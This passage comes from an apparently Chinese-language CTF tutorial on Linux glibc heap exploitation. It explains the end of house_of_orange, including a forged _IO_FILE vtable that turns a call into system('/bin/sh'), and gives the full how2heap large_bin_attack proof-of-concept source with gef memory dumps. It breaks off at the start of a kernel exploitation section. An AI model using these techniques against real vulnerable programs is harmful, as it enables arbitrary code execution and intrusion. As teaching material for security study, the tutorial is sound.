0x0000000000000000 \u7d27\u63a5\u7740\uff0c\u7533\u8bf7\u4e00\u5757\u5927\u5185\u5b58\uff0c\u6b64\u65f6\u7531\u4e8e\u4fee\u6539\u540e\u7684 top chunk size \u4e0d\u80fd\u6ee1\u8db3\u9700\u6c42\uff0c\u5219\u8c03\u7528 sysmalloc \u7684\u7b2c\u4e00\u79cd\u65b9\u6cd5\u6269\u5145 top chunk\uff0c\u7ed3\u679c\u662f\u5728 old_top \u540e\u9762\u65b0\u5efa\u4e86\u4e00\u4e2a top chunk \u7528\u6765\u5b58\u653e new_top\uff0c\u7136\u540e\u5c06 old_top \u91ca\u653e\uff0c\u5373\u88ab\u6dfb\u52a0\u5230\u4e86 unsorted bin \u4e2d\uff1a gef\u27a4 x/4gx p1-0x10+0x400 0x602400: 0x0000000000000000 0x0000000000000be1 <-- old top chunk [be freed] 0x602410: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 <-- fd, bk pointer gef\u27a4 x/4gx p1-0x10+0x400+0xbe0 0x602fe0: 0x0000000000000be0 0x0000000000000010 <-- fencepost chunk 1 0x602ff0: 0x0000000000000000 0x0000000000000011 <-- fencepost chunk 2 gef\u27a4 x/4gx p2-0x10 0x623000: 0x0000000000000000 0x0000000000001011 <-- chunk p2 0x623010: 0x0000000000000000 0x0000000000000000 gef\u27a4 x/4gx p2-0x10+0x1010 0x624010: 0x0000000000000000 0x0000000000020ff1 <-- new top chunk 0x624020: 0x0000000000000000 0x0000000000000000 gef\u27a4 heap bins unsorted [ Unsorted Bin for arena 'main_arena' ] [+] unsorted_bins[0]: fw=0x602400, bk=0x602400 \u2192 Chunk(addr=0x602410, size=0xbe0, flags=PREV_INUSE) \u4e8e\u662f\u5c31\u6cc4\u6f0f\u51fa\u4e86 libc \u5730\u5740\u3002\u53e6\u5916\u53ef\u4ee5\u770b\u5230 old top chunk \u88ab\u7f29\u5c0f\u4e86 0x20\uff0c\u7f29\u5c0f\u7684\u7a7a\u95f4\u88ab\u7528\u4e8e\u653e\u7f6e fencepost chunk\u3002\u6b64\u65f6\u7684\u5806\u7a7a\u95f4\u5e94\u8be5\u662f\u8fd9\u6837\u7684\uff1a +---------------+ | p1 | +---------------+ | old top-0x20 | +---------------+ | fencepost 1 | +---------------+ | fencepost 2 | +---------------+ | ... | +---------------+ | p2 | +---------------+ | new top | +---------------+ \u8be6\u7ec6\u8fc7\u7a0b\u5982\u4e0b\uff1a if (old_size != 0) { /* Shrink old_top to insert fenceposts, keeping size a multiple of MALLOC_ALIGNMENT. We know there is at least enough space in old_top to do this. */ old_size = (old_size - 4 * SIZE_SZ) & ~MALLOC_ALIGN_MASK; set_head (old_top, old_size | PREV_INUSE); /* Note that the following assignments completely overwrite old_top when old_size was previously MINSIZE. This is intentional. We need the fencepost, even if old_top otherwise gets lost. */ chunk_at_offset (old_top, old_size)->size = (2 * SIZE_SZ) | PREV_INUSE; chunk_at_offset (old_top, old_size + 2 * SIZE_SZ)->size = (2 * SIZE_SZ) | PREV_INUSE; /* If possible, release the rest. */ if (old_size >= MINSIZE) { _int_free (av, old_top, 1); } } \u6839\u636e\u653e\u5165 unsorted bin \u4e2d old top chunk \u7684 fd/bk \u6307\u9488\uff0c\u53ef\u4ee5\u63a8\u7b97\u51fa _IO_list_all \u7684\u5730\u5740\u3002\u7136\u540e\u901a\u8fc7\u6ea2\u51fa\u5c06 old top \u7684 bk \u6539\u5199\u4e3a _IO_list_all-0x10 \uff0c\u8fd9\u6837\u5728\u8fdb\u884c unsorted bin attack \u65f6\uff0c\u5c31\u4f1a\u5c06 _IO_list_all \u4fee\u6539\u4e3a &unsorted_bin-0x10 \uff1a /* remove from unsorted list */ unsorted_chunks (av)->bk = bck; bck->fd = unsorted_chunks (av); gef\u27a4 x/4gx p1-0x10+0x400 0x602400: 0x0000000000000000 0x0000000000000be1 0x602410: 0x00007ffff7dd1b78 0x00007ffff7dd2510 \u8fd9\u91cc\u8bb2\u4e00\u4e0b glibc \u4e2d\u7684\u5f02\u5e38\u5904\u7406\u3002\u4e00\u822c\u5728\u51fa\u73b0\u5185\u5b58\u9519\u8bef\u65f6\uff0c\u4f1a\u8c03\u7528\u51fd\u6570 malloc_printerr() \u6253\u5370\u51fa\u9519\u4fe1\u606f\uff0c\u6211\u4eec\u987a\u7740\u4ee3\u7801\u4e00\u76f4\u8ddf\u8e2a\u4e0b\u53bb\uff1a static void malloc_printerr (int action, const char *str, void *ptr, mstate ar_ptr) { [...] if ((action & 5) == 5) __libc_message (action & 2, \"%s\\n\", str); else if (action & 1) { char buf[2 * sizeof (uintptr_t) + 1]; buf[sizeof (buf) - 1] = '\\0'; char *cp = _itoa_word ((uintptr_t) ptr, &buf[sizeof (buf) - 1], 16, 0); while (cp > buf) *--cp = '0'; __libc_message (action & 2, \"*** Error in `%s': %s: 0x%s ***\\n\", __libc_argv[0] ? : \"<unknown>\", str, cp); } else if (action & 2) abort (); } \u8c03\u7528 __libc_message \uff1a // sysdeps/posix/libc_fatal.c /* Abort with an error message. */ void __libc_message (int do_abort, const char *fmt, ...) { [...] if (do_abort) { BEFORE_ABORT (do_abort, written, fd); /* Kill the application. */ abort (); } } do_abort \u8c03\u7528 fflush \uff0c\u5373 _IO_flush_all_lockp \uff1a // stdlib/abort.c #define fflush(s) _IO_flush_all_lockp (0) if (stage == 1) { ++stage; fflush (NULL); } // libio/genops.c int _IO_flush_all_lockp (int do_lock) { int result = 0; struct _IO_FILE *fp; int last_stamp; #ifdef _IO_MTSAFE_IO __libc_cleanup_region_start (do_lock, flush_cleanup, NULL); if (do_lock) _IO_lock_lock (list_all_lock); #endif last_stamp = _IO_list_all_stamp; fp = (_IO_FILE *) _IO_list_all; // \u5c06\u5176\u8986\u76d6 while (fp != NULL) { run_fp = fp; if (do_lock) _IO_flockfile (fp); if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base) #if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T || (_IO_vtable_offset (fp) == 0 && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)) #endif ) && _IO_OVERFLOW (fp, EOF) == EOF) // \u5c06\u5176\u4fee\u6539\u4e3a system \u51fd\u6570 result = EOF; if (do_lock) _IO_funlockfile (fp); run_fp = NULL; if (last_stamp != _IO_list_all_stamp) { /* Something was added to the list. Start all over again. */ fp = (_IO_FILE *) _IO_list_all; last_stamp = _IO_list_all_stamp; } else fp = fp->_chain; // \u6307\u5411\u6211\u4eec\u6307\u5b9a\u7684\u533a\u57df } #ifdef _IO_MTSAFE_IO if (do_lock) _IO_lock_unlock (list_all_lock); __libc_cleanup_region_end (0); #endif return result; } _IO_list_all \u662f\u4e00\u4e2a _IO_FILE_plus \u7c7b\u578b\u7684\u5bf9\u8c61\uff0c\u6211\u4eec\u7684\u76ee\u7684\u5c31\u662f\u5c06 _IO_list_all \u6307\u9488\u6539\u5199\u4e3a\u4e00\u4e2a\u4f2a\u9020\u7684\u6307\u9488\uff0c\u5b83\u7684 _IO_OVERFLOW \u6307\u5411 system\uff0c\u5e76\u4e14\u524d 8 \u5b57\u8282\u88ab\u8bbe\u7f6e\u4e3a '/bin/sh'\uff0c\u6240\u4ee5\u5bf9 _IO_OVERFLOW(fp, EOF) \u7684\u8c03\u7528\u6700\u7ec8\u4f1a\u53d8\u6210\u5bf9 system('/bin/sh') \u7684\u8c03\u7528\u3002 // libio/libioP.h /* We always allocate an extra word following an _IO_FILE. This contains a pointer to the function jump table used. This is for compatibility with C++ streambuf; the word can be used to smash to a pointer to a virtual function table. */ struct _IO_FILE_plus { _IO_FILE file; const struct _IO_jump_t *vtable; }; // libio/libio.h struct _IO_FILE { int _flags; /* High-order word is _IO_MAGIC; rest is flags. */ #define _IO_file_flags _flags /* The following pointers correspond to the C++ streambuf protocol. */ /* Note: Tk uses the _IO_read_ptr and _IO_read_end fields directly. */ char* _IO_read_ptr; /* Current read pointer */ char* _IO_read_end; /* End of get area. */ char* _IO_read_base; /* Start of putback+get area. */ char* _IO_write_base; /* Start of put area. */ char* _IO_write_ptr; /* Current put pointer. */ char* _IO_write_end; /* End of put area. */ char* _IO_buf_base; /* Start of reserve area. */ char* _IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; int _fileno; #if 0 int _blksize; #else int _flags2; #endif _IO_off_t _old_offset; /* This used to be _offset but it's too small. */ #define __HAVE_COLUMN /* temporary */ /* 1+column number of pbase(); 0 is unknown. */ unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; /* char* _save_gptr; char* _save_egptr; */ _IO_lock_t *_lock; #ifdef _IO_USE_OLD_IO_FILE }; \u5176\u4e2d\u6709\u4e00\u4e2a\u6307\u5411\u51fd\u6570\u8df3\u8f6c\u8868\u7684\u6307\u9488\uff0c _IO_jump_t \u7684\u7ed3\u6784\u5982\u4e0b\uff1a // libio/libioP.h struct _IO_jump_t { JUMP_FIELD(size_t, __dummy); JUMP_FIELD(size_t, __dummy2); JUMP_FIELD(_IO_finish_t, __finish); JUMP_FIELD(_IO_overflow_t, __overflow); JUMP_FIELD(_IO_underflow_t, __underflow); JUMP_FIELD(_IO_underflow_t, __uflow); JUMP_FIELD(_IO_pbackfail_t, __pbackfail); /* showmany */ JUMP_FIELD(_IO_xsputn_t, __xsputn); JUMP_FIELD(_IO_xsgetn_t, __xsgetn); JUMP_FIELD(_IO_seekoff_t, __seekoff); JUMP_FIELD(_IO_seekpos_t, __seekpos); JUMP_FIELD(_IO_setbuf_t, __setbuf); JUMP_FIELD(_IO_sync_t, __sync); JUMP_FIELD(_IO_doallocate_t, __doallocate); JUMP_FIELD(_IO_read_t, __read); JUMP_FIELD(_IO_write_t, __write); JUMP_FIELD(_IO_seek_t, __seek); JUMP_FIELD(_IO_close_t, __close); JUMP_FIELD(_IO_stat_t, __stat); JUMP_FIELD(_IO_showmanyc_t, __showmanyc); JUMP_FIELD(_IO_imbue_t, __imbue); #if 0 get_column; set_column; #endif }; \u4f2a\u9020 _IO_jump_t \u4e2d\u7684 __overflow \u4e3a system \u51fd\u6570\u7684\u5730\u5740\uff0c\u4ece\u800c\u8fbe\u5230\u6267\u884c shell \u7684\u76ee\u7684\u3002 \u5f53\u53d1\u751f\u5185\u5b58\u9519\u8bef\u8fdb\u5165 _IO_flush_all_lockp \u540e\uff0c _IO_list_all \u4ecd\u7136\u6307\u5411 unsorted bin\uff0c\u8fd9\u5e76\u4e0d\u662f\u4e00\u4e2a\u6211\u4eec\u80fd\u63a7\u5236\u7684\u5730\u5740\u3002\u6240\u4ee5\u9700\u8981\u901a\u8fc7 fp->_chain \u6765\u5c06 fp \u6307\u5411\u6211\u4eec\u80fd\u63a7\u5236\u7684\u5730\u65b9\u3002\u6240\u4ee5\u5c06 size \u5b57\u6bb5\u8bbe\u7f6e\u4e3a 0x61\uff0c\u56e0\u4e3a\u6b64\u65f6 _IO_list_all \u662f &unsorted_bin-0x10 \uff0c\u504f\u79fb 0x60 \u4f4d\u7f6e\u4e0a\u662f smallbins[5]\u3002\u6b64\u65f6\uff0c\u5982\u679c\u89e6\u53d1\u4e00\u4e2a\u4e0d\u9002\u5408\u7684 small chunk \u5206\u914d\uff0cmalloc \u5c31\u4f1a\u5c06 old top \u4ece unsorted bin \u653e\u56de smallbins[5] \u4e2d\u3002\u800c\u5728 _IO_FILE \u7ed3\u6784\u4e2d\uff0c\u504f\u79fb 0x60 \u6307\u5411 struct _IO_marker *_markers \uff0c\u504f\u79fb 0x68 \u6307\u5411 struct _IO_FILE *_chain \uff0c\u8fd9\u4e24\u4e2a\u503c\u6b63\u597d\u662f old top \u7684\u8d77\u59cb\u5730\u5740\u3002\u8fd9\u6837 fp \u5c31\u6307\u5411\u4e86 old top\uff0c\u8fd9\u662f\u4e00\u4e2a\u6211\u4eec\u80fd\u591f\u63a7\u5236\u7684\u5730\u5740\u3002 \u5728\u5c06 _IO_OVERFLOW \u4fee\u6539\u4e3a system \u7684\u65f6\u5019\uff0c\u6709\u4e00\u4e9b\u6761\u4ef6\u68c0\u67e5\uff1a if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base) #if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T || (_IO_vtable_offset (fp) == 0 && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)) #endif ) && _IO_OVERFLOW (fp, EOF) == EOF) // \u9700\u8981\u4fee\u6539\u4e3a system \u51fd\u6570 // libio/libio.h struct _IO_wide_data *_wide_data; /* Extra data for wide character streams. */ struct _IO_wide_data { wchar_t *_IO_read_ptr; /* Current read pointer */ wchar_t *_IO_read_end; /* End of get area. */ wchar_t *_IO_read_base; /* Start of putback+get area. */ wchar_t *_IO_write_base; /* Start of put area. */ wchar_t *_IO_write_ptr; /* Current put pointer. */ wchar_t *_IO_write_end; /* End of put area. */ wchar_t *_IO_buf_base; /* Start of reserve area. */ wchar_t *_IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ wchar_t *_IO_save_base; /* Pointer to start of non-current get area. */ wchar_t *_IO_backup_base; /* Pointer to first valid character of backup area */ wchar_t *_IO_save_end; /* Pointer to end of non-current get area. */ __mbstate_t _IO_state; __mbstate_t _IO_last_state; struct _IO_codecvt _codecvt; wchar_t _shortbuf[1]; const struct _IO_jump_t *_wide_vtable; }; \u6240\u4ee5\u8fd9\u91cc\u6211\u4eec\u8bbe\u7f6e fp->_mode = 0 \uff0c fp->_IO_write_base = (char *) 2 \u548c fp->_IO_write_ptr = (char *) 3 \uff0c\u4ece\u800c\u7ed5\u8fc7\u68c0\u67e5\u3002 \u7136\u540e\uff0c\u5c31\u662f\u4fee\u6539 _IO_jump_t \uff0c\u5c06\u5176\u6307\u5411 winner\uff1a gef\u27a4 x/30gx p1-0x10+0x400 0x602400: 0x0068732f6e69622f 0x0000000000000061 <-- old top 0x602410: 0x00007ffff7dd1b78 0x00007ffff7dd2510 <-- bk points to io_list_all-0x10 0x602420: 0x0000000000000002 0x0000000000000003 <-- _IO_write_base, _IO_write_ptr 0x602430: 0x0000000000000000 0x0000000000000000 0x602440: 0x0000000000000000 0x0000000000000000 0x602450: 0x0000000000000000 0x0000000000000000 0x602460: 0x0000000000000000 0x0000000000000000 0x602470: 0x0000000000000000 0x00000000004006d3 <-- winner 0x602480: 0x0000000000000000 0x0000000000000000 0x602490: 0x0000000000000000 0x0000000000000000 0x6024a0: 0x0000000000000000 0x0000000000000000 0x6024b0: 0x0000000000000000 0x0000000000000000 0x6024c0: 0x0000000000000000 0x0000000000000000 0x6024d0: 0x0000000000000000 0x0000000000602460 <-- vtable 0x6024e0: 0x0000000000000000 0x0000000000000000 gef\u27a4 p *((struct _IO_FILE_plus *) 0x602400) $1 = { file = { _flags = 0x6e69622f, _IO_read_ptr = 0x61 <error: Cannot access memory at address 0x61>, _IO_read_end = 0x7ffff7dd1b78 <main_arena+88> \"\\020@b\", _IO_read_base = 0x7ffff7dd2510 \"\", _IO_write_base = 0x2 <error: Cannot access memory at address 0x2>, _IO_write_ptr = 0x3 <error: Cannot access memory at address 0x3>, _IO_write_end = 0x0, _IO_buf_base = 0x0, _IO_buf_end = 0x0, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x0, _fileno = 0x0, _flags2 = 0x0, _old_offset = 0x4006d3, _cur_column = 0x0, _vtable_offset = 0x0, _shortbuf = \"\", _lock = 0x0, _offset = 0x0, _codecvt = 0x0, _wide_data = 0x0, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0x0, _mode = 0x0, _unused2 = '\\000' <repeats 19 times> }, vtable = 0x602460 } \u6700\u540e\u968f\u610f\u5206\u914d\u4e00\u4e2a chunk\uff0c\u7531\u4e8e size<= 2*SIZE_SZ \uff0c\u6240\u4ee5\u4f1a\u89e6\u53d1 _IO_flush_all_lockp \u4e2d\u7684 _IO_OVERFLOW \u51fd\u6570\uff0c\u83b7\u5f97 shell\u3002 for (;; ) { int iters = 0; while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av)) { bck = victim->bk; if (__builtin_expect (victim->size <= 2 * SIZE_SZ, 0) || __builtin_expect (victim->size > av->system_mem, 0)) malloc_printerr (check_action, \"malloc(): memory corruption\", chunk2mem (victim), av); size = chunksize (victim); \u5230\u6b64\uff0chow2heap \u91cc\u5168\u90e8\u7684\u5806\u5229\u7528\u65b9\u6cd5\u5c31\u5168\u90e8\u8bb2\u5b8c\u4e86\u3002 3.1.9 Linux \u5806\u5229\u7528\uff08\u56db\uff09 how2heap large_bin_attack house_of_rabbit house_of_roman \u53c2\u8003\u8d44\u6599 \u4e0b\u8f7d\u6587\u4ef6 how2heap large_bin_attack #include<stdio.h> #include<stdlib.h> int main() { unsigned long stack_var1 = 0; unsigned long stack_var2 = 0; fprintf(stderr, \"The targets we want to rewrite on stack:\\n\"); fprintf(stderr, \"stack_var1 (%p): %ld\\n\", &stack_var1, stack_var1); fprintf(stderr, \"stack_var2 (%p): %ld\\n\\n\", &stack_var2, stack_var2); unsigned long *p1 = malloc(0x100); fprintf(stderr, \"Now, we allocate the first chunk: %p\\n\", p1 - 2); malloc(0x10); unsigned long *p2 = malloc(0x400); fprintf(stderr, \"Then, we allocate the second chunk(large chunk): %p\\n\", p2 - 2); malloc(0x10); unsigned long *p3 = malloc(0x400); fprintf(stderr, \"Finally, we allocate the third chunk(large chunk): %p\\n\\n\", p3 - 2); malloc(0x10); // deal with tcache - libc-2.26 // int *a[10], *b[10], i; // for (i = 0; i < 7; i++) { // a[i] = malloc(0x100); // b[i] = malloc(0x400); // } // for (i = 0; i < 7; i++) { // free(a[i]); // free(b[i]); // } free(p1); free(p2); fprintf(stderr, \"Now, We free the first and the second chunks now and they will be inserted in the unsorted bin\\n\"); malloc(0x30); fprintf(stderr, \"Then, we allocate a chunk and the freed second chunk will be moved into large bin freelist\\n\\n\"); p2[-1] = 0x3f1; p2[0] = 0; p2[2] = 0; p2[1] = (unsigned long)(&stack_var1 - 2); p2[3] = (unsigned long)(&stack_var2 - 4); fprintf(stderr, \"Now we use a vulnerability to overwrite the freed second chunk\\n\\n\"); free(p3); malloc(0x30); fprintf(stderr, \"Finally, we free the third chunk and malloc again, targets should have already been rewritten:\\n\"); fprintf(stderr, \"stack_var1 (%p): %p\\n\", &stack_var1, (void *)stack_var1); fprintf(stderr, \"stack_var2 (%p): %p\\n\", &stack_var2, (void *)stack_var2); } $ gcc -g large_bin_attack.c $ ./a.out The targets we want to rewrite on stack: stack_var1 (0x7fffffffdeb0): 0 stack_var2 (0x7fffffffdeb8): 0 Now, we allocate the first chunk: 0x555555757000 Then, we allocate the second chunk(large chunk): 0x555555757130 Finally, we allocate the third chunk(large chunk): 0x555555757560 Now, We free the first and the second chunks now and they will be inserted in the unsorted bin Then, we allocate a chunk and the freed second chunk will be moved into large bin freelist Now we use a vulnerability to overwrite the freed second chunk Finally, we free the third chunk and malloc again, targets should have already been rewritten: stack_var1 (0x7fffffffdeb0): 0x555555757560 stack_var2 (0x7fffffffdeb8): 0x555555757560 \u8be5\u6280\u672f\u53ef\u7528\u4e8e\u4fee\u6539\u4efb\u610f\u5730\u5740\u7684\u503c\uff0c\u4f8b\u5982\u6808\u4e0a\u7684\u53d8\u91cf stack_var1 \u548c stack_var2\u3002\u5728\u5b9e\u8df5\u4e2d\u5e38\u5e38\u4f5c\u4e3a\u5176\u4ed6\u6f0f\u6d1e\u5229\u7528\u7684\u524d\u594f\uff0c\u4f8b\u5982\u5728 fastbin attack \u4e2d\u7528\u4e8e\u4fee\u6539\u5168\u5c40\u53d8\u91cf global_max_fast \u4e3a\u4e00\u4e2a\u5f88\u5927\u7684\u503c\u3002 \u9996\u5148\u6211\u4eec\u5206\u914d chunk p1, p2 \u548c p3\uff0c\u5e76\u4e14\u5728\u5b83\u4eec\u4e4b\u95f4\u63d2\u5165\u5176\u4ed6\u7684 chunk \u4ee5\u9632\u6b62\u5728\u91ca\u653e\u65f6\u88ab\u5408\u5e76\u3002\u6b64\u65f6\u7684\u5185\u5b58\u5e03\u5c40\u5982\u4e0b\uff1a gef\u27a4 x/2gx &stack_var1 0x7fffffffde70: 0x0000000000000000 0x0000000000000000 gef\u27a4 x/4gx p1-2 0x555555757000: 0x0000000000000000 0x0000000000000111 <-- p1 0x555555757010: 0x0000000000000000 0x0000000000000000 gef\u27a4 x/8gx p2-6 0x555555757110: 0x0000000000000000 0x0000000000000021 0x555555757120: 0x0000000000000000 0x0000000000000000 0x555555757130: 0x0000000000000000 0x0000000000000411 <-- p2 0x555555757140: 0x0000000000000000 0x0000000000000000 gef\u27a4 x/8gx p3-6 0x555555757540: 0x0000000000000000 0x0000000000000021 0x555555757550: 0x0000000000000000 0x0000000000000000 0x555555757560: 0x0000000000000000 0x0000000000000411 <-- p3 0x555555757570: 0x0000000000000000 0x0000000000000000 gef\u27a4 x/8gx p3+(0x410/8)-2 0x555555757970: 0x0000000000000000 0x0000000000000021 0x555555757980: 0x0000000000000000 0x0000000000000000 0x555555757990: 0x0000000000000000 0x0000000000020671 <-- top 0x5555557579a0: 0x0000000000000000 0x0000000000000000 \u7136\u540e\u4f9d\u6b21\u91ca\u653e\u6389 p1 \u548c p2\uff0c\u8fd9\u4e24\u4e2a free chunk \u5c06\u88ab\u653e\u5165 unsorted bin\uff1a gef\u27a4 x/8gx p1-2 0x555555757000: 0x0000000000000000 0x0000000000000111 <-- p1 [be freed] 0x555555757010: 0x00007ffff7dd3b78 0x0000555555757130 0x555555757020: 0x0000000000000000 0x0000000000000000 0x555555757030: 0x0000000000000000 0x0000000000000000 gef\u27a4 x/8gx p2-2 0x555555757130: 0x0000000000000000 0x0000000000000411 <-- p2 [be freed] 0x555555757140: 0x0000555555757000 0x00007ffff7dd3b78 0x555555757150: 0x0000000000000000 0x0000000000000000 0x555555757160: 0x0000000000000000 0x0000000000000000 gef\u27a4 heap bins unsorted [ Unsorted Bin for arena 'main_arena' ] [+] unsorted_bins[0]: fw=0x555555757130, bk=0x555555757000 \u2192 Chunk(addr=0x555555757140, size=0x410, flags=PREV_INUSE) \u2192 Chunk(addr=0x555555757010, size=0x110, flags=PREV_INUSE) [+] Found 2 chunks in unsorted bin. \u63a5\u4e0b\u6765\u968f\u4fbf malloc \u4e00\u4e2a chunk\uff0c\u5219 p1 \u88ab\u5207\u5206\u4e3a\u4e24\u5757\uff0c\u4e00\u5757\u4f5c\u4e3a\u5206\u914d\u7684 chunk \u8fd4\u56de\uff0c\u5269\u4e0b\u7684\u4e00\u5757\u7ee7\u7eed\u7559\u5728 unsorted bin\uff08p1 \u7684\u4f5c\u7528\u5c31\u5728\u8fd9\u91cc\uff0c\u5982\u679c\u6ca1\u6709 p1\uff0c\u90a3\u4e48\u5207\u5206\u7684\u5c06\u662f p2\uff09\u3002\u800c p2 \u5219\u88ab\u6574\u7406\u56de\u5bf9\u5e94\u7684 large bin \u94fe\u8868\b\u4e2d\uff1a gef\u27a4 x/14gx p1-2 0x555555757000: 0x0000000000000000 0x0000000000000041 <-- p1-1 0x555555757010: 0x00007ffff7dd3c78 0x00007ffff7dd3c78 0x555555757020: 0x0000000000000000 0x0000000000000000 0x555555757030: 0x0000000000000000 0x0000000000000000 0x555555757040: 0x0000000000000000 0x00000000000000d1 <-- p1-2 [be freed] 0x555555757050: 0x00007ffff7dd3b78 0x00007ffff7dd3b78 <-- fd, bk 0x555555757060: 0x0000000000000000 0x0000000000000000 gef\u27a4 x/8gx p2-2 0x555555757130: 0x0000000000000000 0x0000000000000411 <-- p2 [be freed] 0x555555757140: 0x00007ffff7dd3f68 0x00007ffff7dd3f68 <-- fd, bk 0x555555757150: 0x0000555555757130 0x0000555555757130 <-- fd_nextsize, bk_nextsize 0x555555757160: 0x0000000000000000 0x0000000000000000 gef\u27a4 heap bins unsorted [ Unsorted Bin for arena 'main_arena' ] [+] unsorted_bins[0]: fw=0x555555757040, bk=0x555555757040 \u2192 Chunk(addr=0x555555757050, size=0xd0, flags=PREV_INUSE) [+] Found 1 chunks in unsorted bin. gef\u27a4 heap bins large [ Large Bins for arena 'main_arena' ] [+] large_bins[63]: fw=0x555555757130, bk=0x555555757130 \u2192 Chunk(addr=0x555555757140, size=0x410, flags=PREV_INUSE) [+] Found 1 chunks in 1 large non-empty bins. \u6574\u7406\u7684\u8fc7\u7a0b\u5982\u4e0b\u6240\u793a\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f large bins \u4e2d chunk \u6309 fd \u6307\u9488\u7684\u987a\u5e8f\u4ece\u5927\u5230\u5c0f\u6392\u5217\uff0c\u5982\u679c\u5927\u5c0f\u76f8\u540c\u5219\u6309\u7167\u6700\u8fd1\u4f7f\u7528\u987a\u5e8f\u6392\u5217\uff1a /* place chunk in bin */ if (in_smallbin_range (size)) { [ ... ] } else { victim_index = largebin_index (size); bck = bin_at (av, victim_index); fwd = bck->fd; /* maintain large bins in sorted order */ if (fwd != bck) { /* Or with inuse bit to speed comparisons */ size |= PREV_INUSE; /* if smaller than smallest, bypass loop below */ assert ((bck->bk->size & NON_MAIN_ARENA) == 0); if ((unsigned long) (size) < (unsigned long) (bck->bk->size)) { [ ... ] } else { assert ((fwd->size & NON_MAIN_ARENA) == 0); while ((unsigned long) size < fwd->size) { [ ... ] } if ((unsigned long) size == (unsigned long) fwd->size) [ ... ] else { victim->fd_nextsize = fwd; victim->bk_nextsize = fwd->bk_nextsize; fwd->bk_nextsize = victim; victim->bk_nextsize->fd_nextsize = victim; } bck = fwd->bk; } } else [ ... ] } mark_bin (av, victim_index); victim->bk = bck; victim->fd = fwd; fwd->bk = victim; bck->fd = victim; \u5047\u8bbe\u6211\u4eec\u6709\u4e00\u4e2a\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u5bf9 large bin \u91cc\u7684 chunk p2 \u8fdb\u884c\u4fee\u6539\uff0c\u7ed3\u5408\u4e0a\u9762\u7684\u6574\u7406\u8fc7\u7a0b\uff0c\u6211\u4eec\u4f2a\u9020 p2 \u5982\u4e0b\uff1a gef\u27a4 x/8gx p2-2 0x555555757130: 0x0000000000000000 0x00000000000003f1 <-- fake p2 [be freed] 0x555555757140: 0x0000000000000000 0x00007fffffffde60 <-- bk 0x555555757150: 0x0000000000000000 0x00007fffffffde58 <-- bk_nextsize 0x555555757160: 0x0000000000000000 0x0000000000000000 \u540c\u6837\u7684\uff0c\u91ca\u653e p3\uff0c\u5c06\u5176\u653e\u5165 unsorted bin\uff0c\u7d27\u63a5\u7740\u8fdb\u884c malloc \u64cd\u4f5c\uff0c\u5c06 p3 \u6574\u7406\u56de large bin\uff0c\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\u5224\u65ad\u6761\u4ef6 (unsigned long) (size) < (unsigned long) (bck->bk->size) \u4e3a\u5047\uff0c\u7a0b\u5e8f\u5c06\u8fdb\u5165 else \u5206\u652f\uff0c\u5176\u4e2d fwd \u662f fake p2\uff0c victim \u662f p3\uff0c\u63a5\u7740 bck \u88ab\u8d4b\u503c\u4e3a (&stack_var1 - 2)\u3002 \u5728 p3 \u88ab\u653e\u56de large bin \u5e76\u6392\u5e8f\u7684\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u4f4d\u4e8e\u6808\u4e0a\u7684\u4e24\u4e2a\u53d8\u91cf\u4e5f\u88ab\u4fee\u6539\u6210\u4e86 victim \uff0c\u5bf9\u5e94\u7684\u8bed\u53e5\u5206\u522b\u662f bck->fd = victim; \u548c ictim->bk_nextsize->fd_nextsize = victim; \u3002 gef\u27a4 x/2gx &stack_var1 0x7fffffffde70: 0x0000555555757560 0x0000555555757560 gef\u27a4 x/8gx p2-2 0x555555757130: 0x0000000000000000 0x00000000000003f1 0x555555757140: 0x0000000000000000 0x0000555555757560 0x555555757150: 0x0000000000000000 0x0000555555757560 0x555555757160: 0x0000000000000000 0x0000000000000000 gef\u27a4 x/8gx p3-2 0x555555757560: 0x0000000000000000 0x0000000000000411 0x555555757570: 0x0000555555757130 0x00007fffffffde60 0x555555757580: 0x0000555555757130 0x00007fffffffde58 0x555555757590: 0x0000000000000000 0x0000000000000000 \u8003\u8651 libc-2.26 \u4e0a\u7684\u60c5\u51b5\uff0c\u8fd8\u662f\u4e00\u6837\u7684\uff0c\u5904\u7406\u597d tchache \u5c31\u53ef\u4ee5\u4e86\uff0c\u5728 free \u4e4b\u524d\u628a\u4e24\u79cd\u5927\u5c0f\u7684 tcache bin \u90fd\u5360\u6ee1\u3002 3.1.11 Linux \u5185\u6838\u6f0f\u6d1e\u5229\u7528 \u4ece\u7528\u6237\u6001\u5230\u5185\u6838\u6001 \u5185\u6838\u6f0f\u6d1e\u5206\u7c7b \u5185\u6838\u5229\u7528\u65b9\u6cd5 \u53c2\u8003\u8d44\u6599 \u4ece\u7528\u6237\u6001\u5230\u5185\u6838\u6001 \u4f01\u56fe \u7528\u6237\u6001\u6f0f\u6d1e\u5229\u7528 \u5185\u6838\u6001\u6f0f\u6d1e\u5229\u7528 \u86ee\u529b\u6cd5\u5229\u7528\u6f0f\u6d1e \u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u591a\u6b21\u5d29\u6e83\u5e76\u91cd\u542f\uff08\u6216\u81ea\u52a8\u91cd\u542f\uff09 